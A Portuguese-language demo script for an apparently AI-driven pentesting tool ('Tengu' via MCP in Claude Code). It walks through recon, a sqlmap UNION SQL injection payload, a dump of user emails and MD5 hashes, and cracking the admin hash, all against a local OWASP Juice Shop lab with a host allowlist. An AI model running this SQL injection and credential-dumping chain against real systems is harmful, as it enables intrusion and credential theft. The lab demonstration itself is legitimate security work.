# Tengu Demo Script — 10–15 min

**Audiência:** Diretor de segurança
**Alvo:** OWASP Juice Shop (`juice-shop` / `172.20.0.5`)
**Ambiente:** Docker Compose local (`--profile lab`)
**Modo:** Sessão limpa do Claude Code com Tengu via MCP

---

## Pré-Demo (antes de entrar na sala)

```bash
# 1. Subir o ambiente
TENGU_TIER=full docker compose --profile lab up -d

# 2. Aguardar serviços ficarem healthy (~30s)
docker compose ps

# 3. Confirmar Juice Shop acessível
curl -s http://juice-shop:3000/ | grep -o "OWASP Juice Shop"

# 4. Confirmar Tengu healthy
curl -s http://localhost:8000/health

# 5. Verificar IP do juice-shop (para confirmar 172.20.0.5)
docker inspect tengu-juice-shop-1 | grep '"IPAddress"'
```

**Tengu.toml — allowed_hosts para a demo:**
```toml
[targets]
allowed_hosts = ["juice-shop", "172.20.0.5"]
```

---

## Fase 0 — Setup (~1 min)

**Objetivo:** Mostrar que o Tengu tem controle de escopo e valida o ambiente antes de qualquer scan.

### Prompt para colar:
```
Check which pentesting tools are installed and validate that juice-shop is a reachable and allowed target.
```

### O que o Tengu faz:
1. `check_tools` → lista ferramentas disponíveis (nmap, sqlmap, john, whatweb…)
2. `validate_target` → confirma que `juice-shop` está na allowlist

### Output esperado:
```json
{
  "tools": {
    "nmap": {"available": true, "path": "/usr/bin/nmap"},
    "sqlmap": {"available": true, "path": "/usr/bin/sqlmap"},
    "john": {"available": true, "path": "/usr/sbin/john"},
    "whatweb": {"available": true, "path": "/usr/bin/whatweb"}
  }
}
```
```json
{
  "target": "juice-shop",
  "allowed": true,
  "resolved_ip": "172.20.0.5"
}
```

### Talking point:
> "Antes de qualquer ação, o Tengu valida que o alvo está na allowlist configurada — zero scan fora do escopo."

---

## Fase 1 — Recon (~2 min)

**Objetivo:** Identificar serviços, stack tecnológica e superfície de ataque.

### Prompt para colar:
```
Run a quick port scan on juice-shop, then fingerprint the web application on port 3000 and analyze the HTTP response headers.
```

### O que o Tengu faz:
1. `nmap_scan` target=`juice-shop` ports=`3000,443,80` scan_type=`connect` timing=`T4`
2. `whatweb_scan` target=`http://juice-shop:3000`
3. `analyze_headers` target=`http://juice-shop:3000`

### Output esperado (resumido):
```
nmap: port 3000/tcp open (http)

whatweb:
  - Node.js
  - Express
  - Angular
  - X-Powered-By: Express

analyze_headers:
  - Missing: Content-Security-Policy
  - Missing: X-Frame-Options
  - Missing: Strict-Transport-Security
  - X-Powered-By: Express (information disclosure)
```

### Talking point:
> "Em segundos sabemos que é um app Node.js/Express com Angular, sem headers de segurança básicos. Isso já é um finding reportável."

---

## Fase 2 — SQLi Discovery (~4 min)

**Objetivo:** Encontrar e confirmar SQL injection no endpoint de busca de produtos.

### Prompt para colar:
```
Test the Juice Shop product search endpoint for SQL injection vulnerabilities.
The endpoint is: http://juice-shop:3000/rest/products/search?q=test
```

### O que o Tengu faz:
1. `sqlmap_scan` url=`http://juice-shop:3000/rest/products/search?q=test` level=3 risk=2

### Output esperado:
```
sqlmap v1.x — vulnerable!

Parameter: q (GET)
  Type: UNION query
  Title: Generic UNION query (NULL) - 9 columns
  Payload: q=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--

Back-end DBMS: SQLite

Injection confirmed: parameter 'q' is vulnerable
```

### Talking point:
> "UNION-based SQLi confirmado. O sqlmap identificou automaticamente 9 colunas e o DBMS SQLite. Agora vamos extrair dados."

---

## Fase 3 — Data Dump (~3 min)

**Objetivo:** Exfiltrar credenciais dos 22 usuários registrados.

### Prompt para colar:
```
Use SQL injection on juice-shop to extract all user emails, passwords, and roles from the Users table.
Use the vulnerable endpoint: http://juice-shop:3000/rest/products/search?q=test
```

### O que o Tengu faz:
1. `sqlmap_scan` com `--dump` ou `--sql-query` extraindo da tabela `Users`

### Output esperado:
```
Retrieved rows from Users table:

admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 | admin
jim@juice-sh.op   | e541ca7ecf72b8d1286474fc613e5e45 | customer
bender@juice-sh.op| 0c36e517frame...                | customer
...
[22 rows total]
```

### Talking point:
> "22 usuários exfiltrados com email, hash MD5 e papel. Temos o hash do admin. Vamos quebrar."

---

## Fase 4 — Hash Crack (~2 min)

**Objetivo:** Quebrar o hash MD5 do admin para demonstrar impacto real.

### Prompt para colar:
```
Identify the hash type for "0192023a7bbd73250516f069df18b500" and crack it.
```

### O que o Tengu faz:
1. `hash_identify` hash=`0192023a7bbd73250516f069df18b500`
2. `hash_crack` hash=`0192023a7bbd73250516f069df18b500` hash_type=`md5` wordlist=`rockyou`

### Output esperado:
```json
// hash_identify
{
  "possible_types": ["MD5", "MD5(Unix)", "MD5(APR)"],
  "most_likely": "MD5"
}

// hash_crack
{
  "hash": "0192023a7bbd73250516f069df18b500",
  "cracked": true,
  "plaintext": "admin123",
  "tool": "john",
  "time_seconds": 3.2
}
```

### Talking point:
> "Em 3 segundos: admin@juice-sh.op / admin123. Acesso total ao painel administrativo. Impacto: crítico."

---

## Encerramento (~1 min)

### Prompt de relatório (opcional, se sobrar tempo):
```
Generate an executive summary report of the findings from this assessment of juice-shop.
```

### Pontos-chave para mencionar:
- **Zero configuração manual** — o Claude orquestrou todas as ferramentas automaticamente
- **Auditoria completa** — cada ação gravada em `logs/tengu-audit.log`
- **Controle de escopo** — allowlist impede scans acidentais fora do alvo
- **Extensível** — 83 ferramentas MCP, qualquer tool do mercado pode ser integrada

---

## Troubleshooting

### juice-shop não responde
```bash
docker compose --profile lab ps
docker compose --profile lab logs juice-shop --tail=20
# Se necessário:
docker compose --profile lab restart juice-shop
```

### sqlmap retorna "not injectable"
- Confirmar que o Juice Shop está rodando: `curl http://juice-shop:3000/rest/products/search?q=apple`
- Aumentar nível: adicionar `level=5 risk=3` no prompt
- Alternativa: usar URL com IP direto `http://172.20.0.5:3000/rest/products/search?q=test`

### hash_crack não acha senha
- O wordlist padrão pode não ter `admin123` — verificar se `rockyou.txt` está disponível:
  ```bash
  docker exec <tengu-container> ls /usr/share/wordlists/rockyou.txt
  ```
- Alternativa: usar `hash_crack` com `wordlist=/usr/share/wordlists/rockyou.txt`

### Target not allowed
- Verificar `tengu.toml` em produção:
  ```bash
  docker exec <tengu-container> cat /app/tengu.toml | grep allowed_hosts
  ```
- Variável de ambiente: `TENGU_ALLOWED_HOSTS=juice-shop,172.20.0.5`

### Claude não encontra as tools Tengu
- Confirmar MCP conectado: `/mcp` no Claude Code, deve mostrar `tengu (connected)`
- Se SSE: verificar URL no `~/.claude.json`

---

## Checklist Pré-Demo

- [ ] Docker Compose com `--profile lab` rodando
- [ ] `tengu.toml` com `allowed_hosts = ["juice-shop", "172.20.0.5"]`
- [ ] Tengu acessível em `http://localhost:8000/health`
- [ ] Juice Shop acessível em `http://juice-shop:3000`
- [ ] Claude Code com MCP tengu `(connected)`
- [ ] Sessão limpa aberta (`claude` ou nova janela)
- [ ] Roteiro impresso ou em segunda tela
- [ ] Wordlist rockyou.txt disponível no container

---

## Timing de Referência

| Fase | Início | Duração | Acumulado |
|------|--------|---------|-----------|
| 0. Setup | 0:00 | ~1 min | 1 min |
| 1. Recon | 1:00 | ~2 min | 3 min |
| 2. SQLi Discovery | 3:00 | ~4 min | 7 min |
| 3. Data Dump | 7:00 | ~3 min | 10 min |
| 4. Hash Crack | 10:00 | ~2 min | 12 min |
| Buffer / Perguntas | 12:00 | ~3 min | 15 min |
